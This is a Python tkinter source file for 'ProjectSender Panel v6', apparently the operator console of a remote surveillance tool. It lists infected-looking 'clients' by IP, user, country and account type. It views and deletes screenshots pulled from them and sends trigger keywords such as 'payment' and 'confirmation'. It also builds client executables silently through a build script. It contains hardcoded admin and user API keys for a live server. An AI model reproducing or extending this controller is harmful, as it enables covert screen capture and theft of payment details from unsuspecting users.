#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ProjectSender Panel v6 - Railway Edition
لوحة تحكم احترافية مع جدول العملاء
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import threading
import json
import os
import subprocess
import sys
from datetime import datetime
from PIL import Image, ImageTk
from io import BytesIO
import base64
from pathlib import Path

# ==================== التكوين ====================

class Config:
    # Railway Server
    SERVER_URL = "https://sender-production-7ee8.up.railway.app"
    ADMIN_API_KEY = "skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR"
    USER_API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"
    
    CONFIG_FILE = "panel_config.json"
    
    @staticmethod
    def load():
        if os.path.exists(Config.CONFIG_FILE):
            try:
                with open(Config.CONFIG_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    Config.SERVER_URL = data.get("server_url", Config.SERVER_URL)
                    Config.ADMIN_API_KEY = data.get("admin_key", Config.ADMIN_API_KEY)
                    Config.USER_API_KEY = data.get("user_key", Config.USER_API_KEY)
            except:
                pass
    
    @staticmethod
    def save():
        with open(Config.CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "server_url": Config.SERVER_URL,
                "admin_key": Config.ADMIN_API_KEY,
                "user_key": Config.USER_API_KEY
            }, f, indent=2)

Config.load()

# ==================== لوحة التحكم ====================

class AdminPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("ProjectSender Panel v6 - Railway Edition")
        self.root.geometry("1600x900")
        self.root.configure(bg="#1e1e1e")
        
        self.is_running = True
        self.clients = {}
        self.selected_client = None
        self.pages_entries = []
        
        self.create_ui()
        self.start_auto_refresh()
    
    def create_ui(self):
        """إنشاء الواجهة الرسومية"""
        
        # شريط الأدوات العلوي
        toolbar = tk.Frame(self.root, bg="#0a0a0a", height=60)
        toolbar.pack(fill=tk.X, side=tk.TOP)
        
        # العنوان
        title_label = tk.Label(
            toolbar,
            text="💚 ProjectSender Panel v6 - Railway Edition",
            font=("Arial", 14, "bold"),
            bg="#0a0a0a",
            fg="#00ff88"
        )
        title_label.pack(side=tk.LEFT, padx=20, pady=10)
        
        # حقول الإعدادات
        settings_frame = tk.Frame(toolbar, bg="#0a0a0a")
        settings_frame.pack(side=tk.LEFT, padx=20, pady=10)
        
        tk.Label(settings_frame, text="Server URL:", bg="#0a0a0a", fg="#ffffff").pack(side=tk.LEFT, padx=5)
        self.server_url_entry = tk.Entry(settings_frame, width=30)
        self.server_url_entry.pack(side=tk.LEFT, padx=5)
        self.server_url_entry.insert(0, Config.SERVER_URL)
        
        tk.Label(settings_frame, text="Admin Key:", bg="#0a0a0a", fg="#ffffff").pack(side=tk.LEFT, padx=5)
        self.admin_key_entry = tk.Entry(settings_frame, width=20, show="*")
        self.admin_key_entry.pack(side=tk.LEFT, padx=5)
        self.admin_key_entry.insert(0, Config.ADMIN_API_KEY)
        
        tk.Label(settings_frame, text="User Key:", bg="#0a0a0a", fg="#ffffff").pack(side=tk.LEFT, padx=5)
        self.user_key_entry = tk.Entry(settings_frame, width=20, show="*")
        self.user_key_entry.pack(side=tk.LEFT, padx=5)
        self.user_key_entry.insert(0, Config.USER_API_KEY)
        
        # أزرار الإجراءات
        actions_frame = tk.Frame(toolbar, bg="#0a0a0a")
        actions_frame.pack(side=tk.RIGHT, padx=20, pady=10)
        
        save_btn = tk.Button(
            actions_frame,
            text="💾 Save Settings",
            bg="#0066cc",
            fg="white",
            command=self.save_settings,
            padx=10
        )
        save_btn.pack(side=tk.LEFT, padx=5)
        
        test_btn = tk.Button(
            actions_frame,
            text="🧪 Test Connection",
            bg="#00aa00",
            fg="white",
            command=self.test_connection,
            padx=10
        )
        test_btn.pack(side=tk.LEFT, padx=5)
        
        upload_btn = tk.Button(
            actions_frame,
            text="📤 Upload to GitHub",
            bg="#ff6600",
            fg="white",
            command=self.show_github_commands,
            padx=10
        )
        upload_btn.pack(side=tk.LEFT, padx=5)
        
        # ==================== التبويبات ====================
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # تبويب العملاء
        self.clients_tab = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.clients_tab, text="👥 Clients")
        self.create_clients_tab()
        
        # تبويب إنشاء EXE
        self.exe_tab = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.exe_tab, text="🔨 Generate EXE")
        self.create_exe_tab()
    
    def create_clients_tab(self):
        """إنشاء تبويب العملاء مع جدول احترافي"""
        
        main_frame = tk.Frame(self.clients_tab, bg="#1e1e1e")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # عنوان الجدول
        title_label = tk.Label(
            main_frame,
            text="📊 Connected Clients",
            font=("Arial", 12, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title_label.pack(pady=5)
        
        # إطار الجدول
        table_frame = tk.Frame(main_frame, bg="#1e1e1e")
        table_frame.pack(fill=tk.BOTH, expand=True)
        
        # إنشاء Treeview
        columns = (
            "IP Address",
            "Tag",
            "User@PC",
            "Version",
            "Status",
            "User Status",
            "Country",
            "Operating System",
            "Account Type",
            "Note"
        )
        
        self.tree = ttk.Treeview(
            table_frame,
            columns=columns,
            height=25,
            show="tree headings"
        )
        
        # تحديد عرض الأعمدة
        column_widths = {
            "IP Address": 120,
            "Tag": 80,
            "User@PC": 150,
            "Version": 80,
            "Status": 100,
            "User Status": 100,
            "Country": 100,
            "Operating System": 200,
            "Account Type": 100,
            "Note": 100
        }
        
        for col in columns:
            self.tree.column(col, width=column_widths.get(col, 100), anchor="w")
            self.tree.heading(col, text=col)
        
        # تطبيق الألوان
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background="#2d2d2d", foreground="#00ff88", fieldbackground="#2d2d2d")
        style.configure("Treeview.Heading", background="#0a0a0a", foreground="#00ff88")
        style.map('Treeview', background=[('selected', '#0066cc')])
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)
        
        self.tree.pack(side="left", fill=tk.BOTH, expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # ربط الأحداث
        self.tree.bind("<Double-Button-1>", self.on_client_double_click)
        self.tree.bind("<Button-1>", self.on_client_select)
        
        # إطار المعلومات
        info_frame = tk.Frame(main_frame, bg="#1e1e1e")
        info_frame.pack(fill=tk.X, pady=10)
        
        # حقل الكلمات المفتاحية
        keywords_label = tk.Label(
            info_frame,
            text="🔍 Keywords:",
            font=("Arial", 10, "bold"),
            bg="#1e1e1e",
            fg="#ffff00"
        )
        keywords_label.pack(side=tk.LEFT, padx=5)
        
        self.keywords_entry = tk.Entry(
            info_frame,
            bg="#2d2d2d",
            fg="#ffffff",
            width=50
        )
        self.keywords_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        send_keywords_btn = tk.Button(
            info_frame,
            text="✨ Send",
            bg="#00aa00",
            fg="white",
            command=self.send_keywords,
            padx=10
        )
        send_keywords_btn.pack(side=tk.LEFT, padx=5)
        
        view_photos_btn = tk.Button(
            info_frame,
            text="📸 View Photos",
            bg="#0066cc",
            fg="white",
            command=self.open_photos_window,
            padx=10
        )
        view_photos_btn.pack(side=tk.LEFT, padx=5)
        
        delete_photos_btn = tk.Button(
            info_frame,
            text="🗑️ Delete All",
            bg="#cc0000",
            fg="white",
            command=self.delete_all_photos,
            padx=10
        )
        delete_photos_btn.pack(side=tk.LEFT, padx=5)
    
    def create_exe_tab(self):
        """إنشاء تبويب إنشاء EXE"""
        
        main_frame = tk.Frame(self.exe_tab, bg="#1e1e1e")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # العنوان
        title = tk.Label(
            main_frame,
            text="🔨 Create Custom EXE",
            font=("Arial", 14, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title.pack(pady=10)
        
        # قسم الكلمات المفتاحية
        keywords_frame = tk.LabelFrame(
            main_frame,
            text="🔍 Keywords",
            font=("Arial", 11, "bold"),
            bg="#2d2d2d",
            fg="#00ff88",
            padx=10,
            pady=10
        )
        keywords_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # تعليمات
        instruction_label = tk.Label(
            keywords_frame,
            text="Enter keywords separated by commas (example: order,confirmation,scure,payment,success)",
            bg="#2d2d2d",
            fg="#ffff00",
            font=("Arial", 9)
        )
        instruction_label.pack(pady=5)
        
        # حقل الكلمات المفتاحية
        keywords_input_frame = tk.Frame(keywords_frame, bg="#2d2d2d")
        keywords_input_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(keywords_input_frame, text="Keywords:", bg="#2d2d2d", fg="#ffffff", width=12).pack(side=tk.LEFT, padx=5)
        
        self.keywords_input_entry = tk.Entry(
            keywords_input_frame,
            bg="#1e1e1e",
            fg="#00ff88",
            width=60,
            font=("Arial", 10)
        )
        self.keywords_input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.keywords_input_entry.insert(0, "order,confirmation,scure,payment,success")
        
        # حقل عدد الصور
        photos_frame = tk.Frame(keywords_frame, bg="#2d2d2d")
        photos_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(photos_frame, text="Photos per Keyword:", bg="#2d2d2d", fg="#ffffff", width=12).pack(side=tk.LEFT, padx=5)
        
        self.photos_per_keyword_var = tk.StringVar(value="50")
        photos_spin = tk.Spinbox(
            photos_frame,
            from_=1,
            to=500,
            textvariable=self.photos_per_keyword_var,
            width=10,
            font=("Arial", 10)
        )
        photos_spin.pack(side=tk.LEFT, padx=5)
        
        # حالة البناء
        status_frame = tk.Frame(main_frame, bg="#1e1e1e")
        status_frame.pack(fill=tk.X, pady=10)
        
        self.exe_status_label = tk.Label(
            status_frame,
            text="⏳ Ready to build",
            font=("Arial", 11, "bold"),
            bg="#1e1e1e",
            fg="#ffff00"
        )
        self.exe_status_label.pack(pady=5)
        
        # أزرار التحكم
        buttons_frame = tk.Frame(main_frame, bg="#1e1e1e")
        buttons_frame.pack(fill=tk.X, pady=10)
        
        generate_btn = tk.Button(
            buttons_frame,
            text="🔨 Generate EXE",
            bg="#00aa00",
            fg="white",
            font=("Arial", 12, "bold"),
            command=self.generate_exe,
            padx=20,
            pady=10
        )
        generate_btn.pack(side=tk.LEFT, padx=5)
        
        # زر Generate & Save EXE Auto
        auto_build_btn = tk.Button(
            buttons_frame,
            text="⚡ Generate & Save EXE Auto",
            bg="#ff6600",
            fg="white",
            font=("Arial", 12, "bold"),
            command=self.generate_and_save_exe_auto,
            padx=20,
            pady=10
        )
        auto_build_btn.pack(side=tk.LEFT, padx=5)
    
    def save_settings(self):
        """حفظ الإعدادات"""
        Config.SERVER_URL = self.server_url_entry.get()
        Config.ADMIN_API_KEY = self.admin_key_entry.get()
        Config.USER_API_KEY = self.user_key_entry.get()
        Config.save()
        messagebox.showinfo("Success", "Settings saved successfully!")
    
    def test_connection(self):
        """اختبار الاتصال بالخادم"""
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            response = requests.get(
                f"{Config.SERVER_URL}/api/clients",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                messagebox.showinfo("Success", "✅ Connection successful!")
            else:
                messagebox.showerror("Error", f"❌ Connection failed: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"❌ Connection error: {str(e)}")
    
    def refresh_clients(self):
        """تحديث قائمة العملاء"""
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            response = requests.get(
                f"{Config.SERVER_URL}/api/clients",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                self.clients = data.get('clients', {})
                
                # تحديث Treeview
                for item in self.tree.get_children():
                    self.tree.delete(item)
                
                for client_id, client_info in self.clients.items():
                    # Ensure all required fields exist
                    ip_address = client_info.get('ip_address', 'N/A')
                    tag = client_info.get('tag', 'Client')
                    user_pc = client_info.get('user_pc', 'N/A')
                    version = client_info.get('version', '1.0.0')
                    status = client_info.get('status', 'offline')
                    user_status = client_info.get('user_status', 'Active')
                    country = client_info.get('country', 'N/A')
                    operating_system = client_info.get('operating_system', 'Windows')
                    account_type = client_info.get('account_type', 'User')
                    note = client_info.get('note', '')
                    
                    # Display status correctly
                    display_status = "Online" if status == 'online' else "Offline"
                    
                    values = (
                        ip_address,
                        tag,
                        user_pc,
                        version,
                        display_status,
                        user_status,
                        country,
                        operating_system,
                        account_type,
                        note
                    )
                    
                    self.tree.insert("", "end", iid=client_id, values=values)
        except:
            pass
    
    def on_client_select(self, event):
        """عند اختيار عميل"""
        selection = self.tree.selection()
        if selection:
            self.selected_client = selection[0]
            self.keywords_entry.delete(0, tk.END)
    
    def on_client_double_click(self, event):
        """عند الضغط المزدوج على عميل"""
        self.open_photos_window()
    
    def open_photos_window(self):
        """فتح نافذة عرض الصور"""
        if not self.selected_client:
            messagebox.showwarning("Warning", "Please select a client first!")
            return
        
        # إنشاء نافذة جديدة
        photos_window = tk.Toplevel(self.root)
        photos_window.title(f"Photos - {self.selected_client[:8]}")
        photos_window.geometry("1200x700")
        photos_window.configure(bg="#1e1e1e")
        
        # عنوان
        title_label = tk.Label(
            photos_window,
            text=f"📸 Photos for {self.selected_client[:8]}",
            font=("Arial", 14, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title_label.pack(pady=10)
        
        # إطار الصور
        photos_frame = tk.Frame(photos_window, bg="#1e1e1e")
        photos_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Canvas مع Scrollbar
        canvas = tk.Canvas(photos_frame, bg="#2d2d2d")
        scrollbar = ttk.Scrollbar(photos_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg="#2d2d2d")
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # جلب الصور
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            response = requests.get(
                f"{Config.SERVER_URL}/api/screenshots/{self.selected_client}",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                screenshots = response.json().get('screenshots', [])
                
                for screenshot in screenshots:
                    filename = screenshot.get('filename', 'Unknown')
                    image_data = screenshot.get('image_base64', '')
                    
                    # إطار الصورة
                    photo_frame = tk.Frame(scrollable_frame, bg="#1e1e1e")
                    photo_frame.pack(fill=tk.X, padx=5, pady=5)
                    
                    # اسم الملف
                    filename_label = tk.Label(
                        photo_frame,
                        text=filename,
                        bg="#1e1e1e",
                        fg="#00ff88",
                        font=("Arial", 9)
                    )
                    filename_label.pack(anchor=tk.W, padx=5)
                    
                    # الصورة
                    try:
                        image_bytes = base64.b64decode(image_data)
                        image = Image.open(BytesIO(image_bytes))
                        image.thumbnail((1100, 300))
                        photo = ImageTk.PhotoImage(image)
                        
                        img_label = tk.Label(photo_frame, image=photo, bg="#1e1e1e")
                        img_label.image = photo
                        img_label.pack(padx=5, pady=5)
                    except:
                        pass
                    
                    # زر الحذف
                    delete_btn = tk.Button(
                        photo_frame,
                        text="🗑️ Delete",
                        bg="#cc0000",
                        fg="white",
                        command=lambda fn=filename: self.delete_photo(fn)
                    )
                    delete_btn.pack(padx=5, pady=5)
        except:
            pass
        
        # زر حذف الكل
        delete_all_btn = tk.Button(
            photos_window,
            text="🗑️ Delete All Photos",
            bg="#cc0000",
            fg="white",
            command=self.delete_all_photos,
            padx=20,
            pady=10
        )
        delete_all_btn.pack(pady=10)
    
    def delete_photo(self, filename):
        """حذف صورة واحدة"""
        if not self.selected_client:
            return
        
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            response = requests.delete(
                f"{Config.SERVER_URL}/api/screenshots/{self.selected_client}/{filename}",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                messagebox.showinfo("Success", "Photo deleted successfully!")
                self.open_photos_window()
            else:
                messagebox.showerror("Error", f"Failed to delete: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def delete_all_photos(self):
        """حذف جميع الصور"""
        if not self.selected_client:
            messagebox.showwarning("Warning", "Please select a client first!")
            return
        
        if messagebox.askyesno("Confirm", "Delete all photos for this client?"):
            try:
                headers = {"X-API-Key": Config.ADMIN_API_KEY}
                response = requests.delete(
                    f"{Config.SERVER_URL}/api/screenshots/{self.selected_client}",
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    messagebox.showinfo("Success", "All photos deleted successfully!")
                else:
                    messagebox.showerror("Error", f"Failed to delete: {response.status_code}")
            except Exception as e:
                messagebox.showerror("Error", f"Error: {str(e)}")
    
    def send_keywords(self):
        """إرسال الكلمات المفتاحية إلى العميل"""
        if not self.selected_client:
            messagebox.showwarning("Warning", "Please select a client first!")
            return
        
        keywords_text = self.keywords_entry.get().strip()
        if not keywords_text:
            messagebox.showwarning("Warning", "Please enter keywords!")
            return
        
        # تقسيم الكلمات
        keywords = [k.strip() for k in keywords_text.split(",") if k.strip()]
        
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            data = {
                "client_id": self.selected_client,
                "keywords": keywords
            }
            
            response = requests.post(
                f"{Config.SERVER_URL}/api/set_keywords",
                json=data,
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                messagebox.showinfo("Success", f"Keywords sent: {', '.join(keywords)}")
                self.keywords_entry.delete(0, tk.END)
            else:
                messagebox.showerror("Error", f"Failed to send keywords: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def generate_exe(self):
        """إنشاء EXE"""
        keywords_text = self.keywords_input_entry.get().strip()
        if not keywords_text:
            messagebox.showerror("Error", "Please enter keywords!")
            return
        
        keywords = [k.strip() for k in keywords_text.split(",") if k.strip()]
        photos_per_keyword = int(self.photos_per_keyword_var.get())
        
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            pages = [
                {"name": keyword, "photo_count": photos_per_keyword}
                for keyword in keywords
            ]
            
            data = {
                "pages": pages,
                "exe_name": "ProjectSender_Client"
            }
            
            response = requests.post(
                f"{Config.SERVER_URL}/api/generate_exe",
                json=data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                exe_id = result.get("exe_id")
                messagebox.showinfo("Success", f"EXE created!\nEXE ID: {exe_id}")
            else:
                messagebox.showerror("Error", f"Failed to create EXE: {response.text}")
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def generate_and_save_exe_auto(self):
        """إنشاء وحفظ EXE تلقائياً"""
        keywords_text = self.keywords_input_entry.get().strip()
        if not keywords_text:
            messagebox.showerror("Error", "Please enter keywords!")
            return
        
        keywords = [k.strip() for k in keywords_text.split(",") if k.strip()]
        photos_per_keyword = int(self.photos_per_keyword_var.get())
        
        try:
            # الخطوة 1: إنشاء EXE ID
            self.exe_status_label.config(
                text="⏳ Creating EXE configuration...",
                fg="#ffff00"
            )
            self.root.update()
            
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            pages = [
                {"name": keyword, "photo_count": photos_per_keyword}
                for keyword in keywords
            ]
            
            data = {
                "pages": pages,
                "exe_name": "ProjectSender_Client"
            }
            
            response = requests.post(
                f"{Config.SERVER_URL}/api/generate_exe",
                json=data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code != 200:
                messagebox.showerror("Error", f"Failed to create EXE: {response.text}")
                return
            
            result = response.json()
            exe_id = result.get("exe_id")
            
            # الخطوة 2: اختيار مكان الحفظ
            self.exe_status_label.config(
                text="⏳ Selecting save location...",
                fg="#ffff00"
            )
            self.root.update()
            
            file_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("EXE files", "*.exe"), ("All files", "*.*")],
                initialfile=f"ProjectSender_Client_{exe_id[:8]}.exe"
            )
            
            if not file_path:
                messagebox.showwarning("Cancelled", "Build cancelled by user")
                return
            
            # الخطوة 3: بناء EXE
            self.exe_status_label.config(
                text="⏳ Building EXE...",
                fg="#ffff00"
            )
            self.root.update()
            
            # استدعاء build_exe_from_config.py
            try:
                # البحث عن build_exe_from_config_v4.py (الأحدث)
                script_path = Path(__file__).parent / "build_exe_from_config_v4.py"
                if not script_path.exists():
                    script_path = Path("build_exe_from_config_v4.py")
                
                # fallback إلى v3 إذا لم توجد v4
                if not script_path.exists():
                    script_path = Path(__file__).parent / "build_exe_from_config_v3.py"
                if not script_path.exists():
                    script_path = Path("build_exe_from_config_v3.py")
                
                # fallback إلى v2 إذا لم توجد v3
                if not script_path.exists():
                    script_path = Path(__file__).parent / "build_exe_from_config_v2.py"
                if not script_path.exists():
                    script_path = Path("build_exe_from_config_v2.py")
                
                if not script_path.exists():
                    messagebox.showerror("Error", "build_exe_from_config_v3.py not found!")
                    return
                
                # تشغيل البناء
                # ✅ إصلاح مشكلة الترميز على Windows
                env = os.environ.copy()
                env['PYTHONIOENCODING'] = 'utf-8'
                
                kwargs = {
                    "stdout": subprocess.DEVNULL,
                    "stderr": subprocess.DEVNULL,
                    "env": env
                }
                
                if sys.platform == 'win32':
                    import subprocess as sp
                    kwargs['creationflags'] = sp.CREATE_NO_WINDOW
                
                result = subprocess.run(
                    [sys.executable, str(script_path), exe_id, file_path],
                    **kwargs
                )
                
                if result.returncode != 0:
                    # محاولة قراءة ملف السجل إن وجد
                    error_msg = f"Build failed with return code: {result.returncode}"
                    log_file = Path(file_path).parent / "build_error.log"
                    if log_file.exists():
                        try:
                            with open(log_file, "r", encoding="utf-8") as f:
                                error_msg += f"\n\nError Log:\n{f.read()[:500]}"
                        except:
                            pass
                    messagebox.showerror("Build Error", error_msg)
                    return
                
                # النجاح
                self.exe_status_label.config(
                    text=f"✅ EXE Saved! ID: {exe_id}",
                    fg="#00ff00"
                )
                
                messagebox.showinfo(
                    "Success",
                    f"EXE created and saved successfully!\n\n"
                    f"File: {file_path}\n\n"
                    f"EXE ID: {exe_id}\n\n"
                    f"Keywords: {', '.join(keywords)}\n\n"
                    f"You can now give this EXE to your client."
                )
            except subprocess.TimeoutExpired:
                messagebox.showerror("Error", "Build process timed out!")
            except Exception as e:
                messagebox.showerror("Error", f"Build error: {str(e)}")
        
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def start_auto_refresh(self):
        """بدء التحديث التلقائي"""
        def refresh_loop():
            while self.is_running:
                self.refresh_clients()
                threading.Event().wait(5)
        
        self.refresh_thread = threading.Thread(target=refresh_loop, daemon=True)
        self.refresh_thread.start()
    
    def show_github_commands(self):
        """عرض أوامر git لرفع الملفات إلى GitHub"""
        
        commands = """
## الخطوة 1: تحديث الملفات المحلية

```bash
cd /path/to/your/repo
```

## الخطوة 2: نسخ الملفات المحدثة

```bash
cp main_backend_v4.py .
cp panel_v6_railway.py .
cp build_exe_from_config_v3.py .
cp requirements.txt .
```

## الخطوة 3: إضافة الملفات

```bash
git add .
```

## الخطوة 4: Commit

```bash
git commit -m "Update: Add v6 features - Professional table UI"
```

## الخطوة 5: Push

```bash
git push origin main
```
"""
        
        # إنشاء نافذة جديدة
        commands_window = tk.Toplevel(self.root)
        commands_window.title("GitHub Upload Commands")
        commands_window.geometry("600x500")
        commands_window.configure(bg="#1e1e1e")
        
        # عنوان
        title = tk.Label(
            commands_window,
            text="📤 أوامر رفع الملفات إلى GitHub",
            font=("Arial", 12, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title.pack(pady=10)
        
        # نص الأوامر
        text_widget = tk.Text(
            commands_window,
            bg="#2d2d2d",
            fg="#00ff88",
            font=("Courier", 10),
            height=20,
            width=70
        )
        text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text_widget.insert(1.0, commands)
        text_widget.config(state=tk.DISABLED)

# ==================== البرنامج الرئيسي ====================

if __name__ == "__main__":
    root = tk.Tk()
    app = AdminPanel(root)
    root.mainloop()
